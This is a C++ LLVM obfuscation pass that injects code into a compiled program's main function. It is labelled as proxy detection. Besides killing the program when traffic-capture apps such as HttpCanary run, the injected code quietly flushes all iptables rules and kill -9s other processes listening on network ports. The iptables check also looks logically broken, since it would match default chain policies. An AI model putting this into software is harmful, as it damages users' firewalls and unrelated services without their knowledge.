//===- ProxyDetect.cpp - 代理/网络检测注入Pass -----------------===//
//
//                     The LLVM Compiler Infrastructure
//
// This file is distributed under the University of Illinois Open Source
// License. See LICENSE.TXT for details.
//
//===----------------------------------------------------------------------===//
//
// 本文件实现代理/网络检测注入Pass，在程序入口点注入检测代码
// 检测代理应用进程、iptables规则等
//
//===----------------------------------------------------------------------===//

#include "llvm/Transforms/Obfuscation/ProxyDetect.h"
#include "llvm/Transforms/Obfuscation/ObfuscationPassManager.h"
#include "llvm/IR/Constants.h"
#include "llvm/IR/DerivedTypes.h"
#include "llvm/IR/Function.h"
#include "llvm/IR/GlobalVariable.h"
#include "llvm/IR/IRBuilder.h"
#include "llvm/IR/Instructions.h"
#include "llvm/IR/LLVMContext.h"
#include "llvm/IR/Module.h"
#include "llvm/IR/Type.h"
#include "llvm/Pass.h"
#include "llvm/Support/raw_ostream.h"

#define DEBUG_TYPE "proxydetect"

using namespace llvm;

namespace {

struct ProxyDetect : public ModulePass {
    static char ID;

    ProxyDetect() : ModulePass(ID) {
        initializeProxyDetectPass(*PassRegistry::getPassRegistry());
    }

    StringRef getPassName() const override {
        return {"ProxyDetect"};
    }

    bool runOnModule(Module &M) override;
    
    Function* createReportAndKillFunc(Module &M);
    Function* createCmdlineCheckFunc(Module &M, Function *ReportAndKillFunc);
    Function* createIptablesCheckFunc(Module &M, Function *ReportAndKillFunc);
    Function* createIptablesClearFunc(Module &M);
    Function* createKillPortsFunc(Module &M);
};

}

char ProxyDetect::ID = 0;

Function* ProxyDetect::createReportAndKillFunc(Module &M) {
    LLVMContext &Ctx = M.getContext();
    
    Type *VoidTy = Type::getVoidTy(Ctx);
    Type *Int32Ty = Type::getInt32Ty(Ctx);
    PointerType *CharPtrTy = PointerType::get(Ctx, 0);
    
    FunctionType *FuncTy = FunctionType::get(VoidTy, {}, false);
    Function *Func = Function::Create(
        FuncTy,
        GlobalValue::InternalLinkage,
        M.getDataLayout().getProgramAddressSpace(),
        "proxy_report_and_kill",
        &M
    );
    
    Func->addFnAttr(Attribute::NoInline);
    Func->addFnAttr(Attribute::OptimizeNone);
    
    BasicBlock *BB = BasicBlock::Create(Ctx, "entry", Func);
    IRBuilder<> Builder(BB);
    
    FunctionCallee PrintfFunc = M.getOrInsertFunction(
        "printf",
        FunctionType::get(Int32Ty, {CharPtrTy}, true)
    );
    
    FunctionCallee FflushFunc = M.getOrInsertFunction(
        "fflush",
        FunctionType::get(Int32Ty, {CharPtrTy}, false)
    );
    
    Constant *MsgStr = ConstantDataArray::getString(Ctx, "检测到代理/网络异常!!!\n");
    GlobalVariable *MsgGV = new GlobalVariable(
        M,
        MsgStr->getType(),
        true,
        GlobalValue::PrivateLinkage,
        MsgStr,
        ".proxy.msg"
    );
    Constant *MsgPtr = ConstantExpr::getBitCast(MsgGV, CharPtrTy);
    
    Builder.CreateCall(PrintfFunc, {MsgPtr});
    
    Constant *NullPtr = ConstantPointerNull::get(CharPtrTy);
    Builder.CreateCall(FflushFunc, {NullPtr});
    
    FunctionCallee GetpidFunc = M.getOrInsertFunction(
        "getpid",
        FunctionType::get(Int32Ty, {}, false)
    );
    
    FunctionCallee KillFunc = M.getOrInsertFunction(
        "kill",
        FunctionType::get(Int32Ty, {Int32Ty, Int32Ty}, false)
    );
    
    Value *Pid = Builder.CreateCall(GetpidFunc);
    Value *Sigkill = ConstantInt::get(Int32Ty, 9);
    Builder.CreateCall(KillFunc, {Pid, Sigkill});
    
    FunctionCallee AsmExitFunc = M.getOrInsertFunction("exit",
        FunctionType::get(Type::getVoidTy(M.getContext()), {Int32Ty}, false));
    Builder.CreateCall(AsmExitFunc, {ConstantInt::get(Int32Ty, 0)});
    
    Builder.CreateUnreachable();
    
    return Func;
}

Function* ProxyDetect::createCmdlineCheckFunc(Module &M, Function *ReportAndKillFunc) {
    LLVMContext &Ctx = M.getContext();
    
    Type *VoidTy = Type::getVoidTy(Ctx);
    Type *Int32Ty = Type::getInt32Ty(Ctx);
    Type *Int64Ty = Type::getInt64Ty(Ctx);
    PointerType *CharPtrTy = PointerType::get(Ctx, 0);
    
    FunctionType *FuncTy = FunctionType::get(VoidTy, {}, false);
    Function *Func = Function::Create(
        FuncTy,
        GlobalValue::InternalLinkage,
        M.getDataLayout().getProgramAddressSpace(),
        "proxy_cmdline_check",
        &M
    );
    
    Func->addFnAttr(Attribute::NoInline);
    
    BasicBlock *EntryBB = BasicBlock::Create(Ctx, "entry", Func);
    BasicBlock *OpenOkBB = BasicBlock::Create(Ctx, "open_ok", Func);
    BasicBlock *OpenFailBB = BasicBlock::Create(Ctx, "open_fail", Func);
    BasicBlock *LoopBB = BasicBlock::Create(Ctx, "loop", Func);
    BasicBlock *CheckEntryBB = BasicBlock::Create(Ctx, "check_entry", Func);
    BasicBlock *ReadCmdlineBB = BasicBlock::Create(Ctx, "read_cmdline", Func);
    BasicBlock *CheckCmdlineBB = BasicBlock::Create(Ctx, "check_cmdline", Func);
    BasicBlock *ExitBB = BasicBlock::Create(Ctx, "exit", Func);
    
    IRBuilder<> Builder(EntryBB);
    
    FunctionCallee OpendirFunc = M.getOrInsertFunction(
        "opendir",
        FunctionType::get(CharPtrTy, {CharPtrTy}, false)
    );
    
    FunctionCallee ReaddirFunc = M.getOrInsertFunction(
        "readdir",
        FunctionType::get(CharPtrTy, {CharPtrTy}, false)
    );
    
    FunctionCallee ClosedirFunc = M.getOrInsertFunction(
        "closedir",
        FunctionType::get(Int32Ty, {CharPtrTy}, false)
    );
    
    FunctionCallee SnprintfFunc = M.getOrInsertFunction(
        "snprintf",
        FunctionType::get(Int32Ty, {CharPtrTy, Int64Ty, CharPtrTy}, true)
    );
    
    FunctionCallee FopenFunc = M.getOrInsertFunction(
        "fopen",
        FunctionType::get(CharPtrTy, {CharPtrTy, CharPtrTy}, false)
    );
    
    FunctionCallee FreadFunc = M.getOrInsertFunction(
        "fread",
        FunctionType::get(Int64Ty, {CharPtrTy, Int64Ty, Int64Ty, CharPtrTy}, false)
    );
    
    FunctionCallee FcloseFunc = M.getOrInsertFunction(
        "fclose",
        FunctionType::get(Int32Ty, {CharPtrTy}, false)
    );
    
    FunctionCallee StrstrFunc = M.getOrInsertFunction(
        "strstr",
        FunctionType::get(CharPtrTy, {CharPtrTy, CharPtrTy}, false)
    );
    
    auto makeString = [&](const char *str) -> Constant* {
        Constant *StrConst = ConstantDataArray::getString(Ctx, str);
        GlobalVariable *StrGV = new GlobalVariable(
            M, StrConst->getType(), true,
            GlobalValue::PrivateLinkage, StrConst,
            ".proxy.str." + Twine(str)
        );
        return ConstantExpr::getBitCast(StrGV, CharPtrTy);
    };
    
    Constant *ProcPath = makeString("/proc/");
    Constant *ReadMode = makeString("r");
    Constant *CmdlineFmt = makeString("/proc/%s/cmdline");
    
    Value *Dir = Builder.CreateCall(OpendirFunc, {ProcPath});
    Value *DirNotNull = Builder.CreateICmpNE(Dir, ConstantPointerNull::get(CharPtrTy));
    Builder.CreateCondBr(DirNotNull, OpenOkBB, OpenFailBB);
    
    Builder.SetInsertPoint(OpenFailBB);
    Builder.CreateBr(ExitBB);
    
    Builder.SetInsertPoint(OpenOkBB);
    Builder.CreateBr(LoopBB);
    
    Builder.SetInsertPoint(LoopBB);
    Value *Entry = Builder.CreateCall(ReaddirFunc, {Dir});
    Value *EntryNotNull = Builder.CreateICmpNE(Entry, ConstantPointerNull::get(CharPtrTy));
    Builder.CreateCondBr(EntryNotNull, CheckEntryBB, ExitBB);
    
    Builder.SetInsertPoint(CheckEntryBB);
    
    Type *PathBufTy = ArrayType::get(Type::getInt8Ty(Ctx), 256);
    Value *PathBuf = Builder.CreateAlloca(PathBufTy, nullptr, "pathbuf");
    Value *PathBufPtr = Builder.CreateBitCast(PathBuf, CharPtrTy);
    
    Value *DNameOffset = ConstantInt::get(Int64Ty, 19);
    Value *DNamePtr = Builder.CreateGEP(Type::getInt8Ty(Ctx), Entry, {DNameOffset});
    
    Builder.CreateCall(SnprintfFunc, {PathBufPtr, ConstantInt::get(Int64Ty, 256), CmdlineFmt, DNamePtr});
    
    Value *Fp = Builder.CreateCall(FopenFunc, {PathBufPtr, ReadMode});
    Value *FpNotNull = Builder.CreateICmpNE(Fp, ConstantPointerNull::get(CharPtrTy));
    Builder.CreateCondBr(FpNotNull, ReadCmdlineBB, LoopBB);
    
    Builder.SetInsertPoint(ReadCmdlineBB);
    
    Type *CmdlineBufTy = ArrayType::get(Type::getInt8Ty(Ctx), 1024);
    Value *CmdlineBuf = Builder.CreateAlloca(CmdlineBufTy, nullptr, "cmdlinebuf");
    Value *CmdlineBufPtr = Builder.CreateBitCast(CmdlineBuf, CharPtrTy);
    
    Builder.CreateCall(FreadFunc, {CmdlineBufPtr, ConstantInt::get(Int64Ty, 1), ConstantInt::get(Int64Ty, 1023), Fp});
    Builder.CreateCall(FcloseFunc, {Fp});
    
    Builder.CreateBr(CheckCmdlineBB);
    
    Builder.SetInsertPoint(CheckCmdlineBB);
    
    Constant *ProxyApps[] = {
        makeString("com.guoshi.httpcanary"),
        makeString("com.network.proxy"),
        makeString("com.reqable.android"),
        makeString("com.evbadroid.wicap"),
        makeString("com.guoshi.httpcanary.premium"),
        makeString("com.httpcanary.pro"),
        makeString("cn.iyya.vvv"),
        makeString("cn.iyya.vv"),
        makeString("com.ikooc.mm"),
        makeString("com.Pro")
    };
    
    Value *AnyFound = nullptr;
    for (Constant *App : ProxyApps) {
        Value *Found = Builder.CreateCall(StrstrFunc, {CmdlineBufPtr, App});
        Value *FoundNotNull = Builder.CreateICmpNE(Found, ConstantPointerNull::get(CharPtrTy));
        if (AnyFound == nullptr) {
            AnyFound = FoundNotNull;
        } else {
            AnyFound = Builder.CreateOr(AnyFound, FoundNotNull);
        }
    }
    
    BasicBlock *FoundBB = BasicBlock::Create(Ctx, "found", Func);
    Builder.CreateCondBr(AnyFound, FoundBB, LoopBB);
    
    Builder.SetInsertPoint(FoundBB);
    Builder.CreateCall(ClosedirFunc, {Dir});
    Builder.CreateCall(ReportAndKillFunc);
    Builder.CreateBr(ExitBB);
    
    Builder.SetInsertPoint(ExitBB);
    Builder.CreateRetVoid();
    
    return Func;
}

Function* ProxyDetect::createIptablesCheckFunc(Module &M, Function *ReportAndKillFunc) {
    LLVMContext &Ctx = M.getContext();
    
    Type *VoidTy = Type::getVoidTy(Ctx);
    Type *Int32Ty = Type::getInt32Ty(Ctx);
    PointerType *CharPtrTy = PointerType::get(Ctx, 0);
    
    FunctionType *FuncTy = FunctionType::get(VoidTy, {}, false);
    Function *Func = Function::Create(
        FuncTy,
        GlobalValue::InternalLinkage,
        M.getDataLayout().getProgramAddressSpace(),
        "proxy_iptables_check",
        &M
    );
    
    Func->addFnAttr(Attribute::NoInline);
    
    BasicBlock *EntryBB = BasicBlock::Create(Ctx, "entry", Func);
    BasicBlock *ExitBB = BasicBlock::Create(Ctx, "exit", Func);
    
    IRBuilder<> Builder(EntryBB);
    
    FunctionCallee PopenFunc = M.getOrInsertFunction(
        "popen",
        FunctionType::get(CharPtrTy, {CharPtrTy, CharPtrTy}, false)
    );
    
    FunctionCallee PcloseFunc = M.getOrInsertFunction(
        "pclose",
        FunctionType::get(Int32Ty, {CharPtrTy}, false)
    );
    
    FunctionCallee FgetsFunc = M.getOrInsertFunction(
        "fgets",
        FunctionType::get(CharPtrTy, {CharPtrTy, Int32Ty, CharPtrTy}, false)
    );
    
    FunctionCallee StrstrFunc = M.getOrInsertFunction(
        "strstr",
        FunctionType::get(CharPtrTy, {CharPtrTy, CharPtrTy}, false)
    );
    
    auto makeString = [&](const char *str) -> Constant* {
        Constant *StrConst = ConstantDataArray::getString(Ctx, str);
        GlobalVariable *StrGV = new GlobalVariable(
            M, StrConst->getType(), true,
            GlobalValue::PrivateLinkage, StrConst,
            ".iptables.str." + Twine(str)
        );
        return ConstantExpr::getBitCast(StrGV, CharPtrTy);
    };
    
    Constant *ReadMode = makeString("r");
    
    const char *IptablesCmds[] = {
        "iptables -t nat -L -n 2>/dev/null",
        "iptables -t filter -L -n 2>/dev/null",
        "iptables -t mangle -L -n 2>/dev/null",
        "iptables -t raw -L -n 2>/dev/null"
    };
    
    Type *LineBufTy = ArrayType::get(Type::getInt8Ty(Ctx), 1035);
    Value *LineBuf = Builder.CreateAlloca(LineBufTy, nullptr, "linebuf");
    Value *LineBufPtr = Builder.CreateBitCast(LineBuf, CharPtrTy);
    
    for (const char *Cmd : IptablesCmds) {
        Constant *CmdStr = makeString(Cmd);
        
        BasicBlock *CheckCmdBB = BasicBlock::Create(Ctx, "check_cmd", Func);
        BasicBlock *LoopBB = BasicBlock::Create(Ctx, "loop", Func);
        BasicBlock *CheckLineBB = BasicBlock::Create(Ctx, "check_line", Func);
        BasicBlock *NextCmdBB = BasicBlock::Create(Ctx, "next_cmd", Func);
        
        Builder.CreateBr(CheckCmdBB);
        
        Builder.SetInsertPoint(CheckCmdBB);
        Value *Fp = Builder.CreateCall(PopenFunc, {CmdStr, ReadMode});
        Value *FpNotNull = Builder.CreateICmpNE(Fp, ConstantPointerNull::get(CharPtrTy));
        Builder.CreateCondBr(FpNotNull, LoopBB, NextCmdBB);
        
        Builder.SetInsertPoint(LoopBB);
        Value *Line = Builder.CreateCall(FgetsFunc, {LineBufPtr, ConstantInt::get(Int32Ty, 1034), Fp});
        Value *LineNotNull = Builder.CreateICmpNE(Line, ConstantPointerNull::get(CharPtrTy));
        Builder.CreateCondBr(LineNotNull, CheckLineBB, NextCmdBB);
        
        Builder.SetInsertPoint(CheckLineBB);
        
        Constant *DnatNeedle = makeString("DNAT");
        Constant *AcceptNeedle = makeString("ACCEPT");
        Constant *DropNeedle = makeString("DROP");
        Constant *MarkNeedle = makeString("MARK");
        
        Value *FoundDnat = Builder.CreateCall(StrstrFunc, {LineBufPtr, DnatNeedle});
        Value *FoundDnatNotNull = Builder.CreateICmpNE(FoundDnat, ConstantPointerNull::get(CharPtrTy));
        
        Value *FoundAccept = Builder.CreateCall(StrstrFunc, {LineBufPtr, AcceptNeedle});
        Value *FoundAcceptNotNull = Builder.CreateICmpNE(FoundAccept, ConstantPointerNull::get(CharPtrTy));
        
        Value *FoundDrop = Builder.CreateCall(StrstrFunc, {LineBufPtr, DropNeedle});
        Value *FoundDropNotNull = Builder.CreateICmpNE(FoundDrop, ConstantPointerNull::get(CharPtrTy));
        
        Value *FoundMark = Builder.CreateCall(StrstrFunc, {LineBufPtr, MarkNeedle});
        Value *FoundMarkNotNull = Builder.CreateICmpNE(FoundMark, ConstantPointerNull::get(CharPtrTy));
        
        Value *AnyRule = Builder.CreateOr(FoundDnatNotNull, FoundAcceptNotNull);
        AnyRule = Builder.CreateOr(AnyRule, FoundDropNotNull);
        AnyRule = Builder.CreateOr(AnyRule, FoundMarkNotNull);
        
        BasicBlock *FoundBB = BasicBlock::Create(Ctx, "found_rule", Func);
        Builder.CreateCondBr(AnyRule, FoundBB, LoopBB);
        
        Builder.SetInsertPoint(FoundBB);
        Builder.CreateCall(PcloseFunc, {Fp});
        Builder.CreateCall(ReportAndKillFunc);
        Builder.CreateBr(ExitBB);
        
        Builder.SetInsertPoint(NextCmdBB);
    }
    
    Builder.CreateBr(ExitBB);
    
    Builder.SetInsertPoint(ExitBB);
    Builder.CreateRetVoid();
    
    return Func;
}

Function* ProxyDetect::createIptablesClearFunc(Module &M) {
    LLVMContext &Ctx = M.getContext();
    
    Type *VoidTy = Type::getVoidTy(Ctx);
    Type *Int32Ty = Type::getInt32Ty(Ctx);
    PointerType *CharPtrTy = PointerType::get(Ctx, 0);
    
    FunctionType *FuncTy = FunctionType::get(VoidTy, {}, false);
    Function *Func = Function::Create(
        FuncTy,
        GlobalValue::InternalLinkage,
        M.getDataLayout().getProgramAddressSpace(),
        "proxy_iptables_clear",
        &M
    );
    
    Func->addFnAttr(Attribute::NoInline);
    
    BasicBlock *BB = BasicBlock::Create(Ctx, "entry", Func);
    IRBuilder<> Builder(BB);
    
    FunctionCallee SystemFunc = M.getOrInsertFunction(
        "system",
        FunctionType::get(Int32Ty, {CharPtrTy}, false)
    );
    
    auto makeString = [&](const char *str) -> Constant* {
        Constant *StrConst = ConstantDataArray::getString(Ctx, str);
        GlobalVariable *StrGV = new GlobalVariable(
            M, StrConst->getType(), true,
            GlobalValue::PrivateLinkage, StrConst,
            ".clear.str." + Twine(str)
        );
        return ConstantExpr::getBitCast(StrGV, CharPtrTy);
    };
    
    const char *ClearCmds[] = {
        "iptables -Z 2>/dev/null",
        "iptables -F 2>/dev/null",
        "iptables -X 2>/dev/null",
        "iptables -t nat -F 2>/dev/null",
        "iptables -t mangle -F 2>/dev/null",
        "iptables -t raw -F 2>/dev/null",
        "iptables -t security -F 2>/dev/null",
        "iptables -t nat -F OUTPUT 2>/dev/null",
        "iptables-save > /dev/null 2>&1"
    };
    
    for (const char *Cmd : ClearCmds) {
        Builder.CreateCall(SystemFunc, {makeString(Cmd)});
    }
    
    Builder.CreateRetVoid();
    
    return Func;
}

Function* ProxyDetect::createKillPortsFunc(Module &M) {
    LLVMContext &Ctx = M.getContext();
    
    Type *VoidTy = Type::getVoidTy(Ctx);
    Type *Int32Ty = Type::getInt32Ty(Ctx);
    PointerType *CharPtrTy = PointerType::get(Ctx, 0);
    
    FunctionType *FuncTy = FunctionType::get(VoidTy, {}, false);
    Function *Func = Function::Create(
        FuncTy,
        GlobalValue::InternalLinkage,
        M.getDataLayout().getProgramAddressSpace(),
        "proxy_kill_ports",
        &M
    );
    
    Func->addFnAttr(Attribute::NoInline);
    
    BasicBlock *EntryBB = BasicBlock::Create(Ctx, "entry", Func);
    IRBuilder<> Builder(EntryBB);
    
    FunctionCallee SystemFunc = M.getOrInsertFunction(
        "system",
        FunctionType::get(Int32Ty, {CharPtrTy}, false)
    );
    
    auto makeString = [&](const char *str) -> Constant* {
        Constant *StrConst = ConstantDataArray::getString(Ctx, str);
        GlobalVariable *StrGV = new GlobalVariable(
            M, StrConst->getType(), true,
            GlobalValue::PrivateLinkage, StrConst,
            ".killport.str." + Twine(str)
        );
        return ConstantExpr::getBitCast(StrGV, CharPtrTy);
    };
    
    const char *KillPortCmds[] = {
        "for pid in $(netstat -tulnp 2>/dev/null | grep -E '127.0.0.1|0.0.0.0' | grep 'LISTEN' | awk '{print $7}' | cut -d'/' -f1 | grep -v '^-$'); do kill -9 $pid 2>/dev/null; done",
        "for pid in $(netstat -tulnp 2>/dev/null | grep '::1' | grep 'LISTEN' | awk '{print $7}' | cut -d'/' -f1 | grep -v '^-$'); do kill -9 $pid 2>/dev/null; done",
        "for pid in $(netstat -tulnp 2>/dev/null | grep 'LISTEN' | awk '{print $7}' | cut -d'/' -f1 | grep -v '^-$' | head -20); do kill -9 $pid 2>/dev/null; done"
    };
    
    for (const char *Cmd : KillPortCmds) {
        Builder.CreateCall(SystemFunc, {makeString(Cmd)});
    }
    
    Builder.CreateRetVoid();
    
    return Func;
}

bool ProxyDetect::runOnModule(Module &M) {
    if (!isLicenseValidated()) return false;

    if (isIRObfuscationDebugEnabled()) {
        errs() << "[DEBUG] ProxyDetect: Injecting proxy detection\n";
    }

    Function *MainFunc = M.getFunction("main");
    if (!MainFunc || MainFunc->isDeclaration()) {
        return false;
    }

    if (MainFunc->empty()) {
        return false;
    }

    BasicBlock &EntryBB = MainFunc->getEntryBlock();
    
    Function *ReportAndKillFunc = createReportAndKillFunc(M);
    Function *CmdlineCheckFunc = createCmdlineCheckFunc(M, ReportAndKillFunc);
    Function *IptablesCheckFunc = createIptablesCheckFunc(M, ReportAndKillFunc);
    Function *IptablesClearFunc = createIptablesClearFunc(M);
    Function *KillPortsFunc = createKillPortsFunc(M);

    IRBuilder<> Builder(&EntryBB, EntryBB.getFirstInsertionPt());

    if (isIRObfuscationDebugEnabled()) {
        LLVMContext &Ctx = M.getContext();
        FunctionCallee PrintfFunc = M.getOrInsertFunction(
            "printf",
            FunctionType::get(Type::getInt32Ty(Ctx), {PointerType::get(Ctx, 0)}, true)
        );
        Constant *DebugStr = ConstantDataArray::getString(Ctx, "[DEBUG] ProxyDetect: Checking proxy/iptables...\n");
        GlobalVariable *DebugGV = new GlobalVariable(
            M, DebugStr->getType(), true,
            GlobalValue::PrivateLinkage, DebugStr,
            ".proxy.debug"
        );
        Builder.CreateCall(PrintfFunc, {ConstantExpr::getBitCast(DebugGV, PointerType::get(Ctx, 0))});
    }

    Builder.CreateCall(IptablesClearFunc);
    Builder.CreateCall(KillPortsFunc);
    Builder.CreateCall(CmdlineCheckFunc);
    Builder.CreateCall(IptablesCheckFunc);

    return true;
}

ModulePass *llvm::createProxyDetectPass() {
    return new ProxyDetect();
}

INITIALIZE_PASS_BEGIN(ProxyDetect, "proxydetect", "Inject proxy/network detection at program start", false, false)
INITIALIZE_PASS_END(ProxyDetect, "proxydetect", "Inject proxy/network detection at program start", false, false)
